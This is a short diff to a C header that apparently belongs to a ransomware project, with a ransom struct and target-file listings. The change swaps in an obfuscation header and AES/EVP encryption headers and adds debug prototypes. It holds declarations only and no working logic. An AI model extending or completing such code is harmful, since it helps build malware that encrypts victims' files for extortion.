@@ -1,11 +1,10 @@
 #ifndef FOUR_NIGHTS
 #define FOUR_NIGHTS
 
-/**
-  * For real encryption, not base64
-  * #include "openssl/include/openssl/blowfish.h"
- **/
-#include "openssl/include/openssl/pem.h"
+#include "obfuscation.h"
+
+#include "aes.h"
+#include "evp.h"
 
 #include <dirent.h>
 #include <limits.h>
@@ -108,4 +107,7 @@ DIR *my_opendir(const char *name);
 ssize_t my_getline(char **lineptr, size_t *n, FILE *stream);
 
 
+/* DEBUGGING */
+void debug_list(target_file_t *target_file_buf);
+void print_for_debug(struct ransom_s ransom);
 #endif
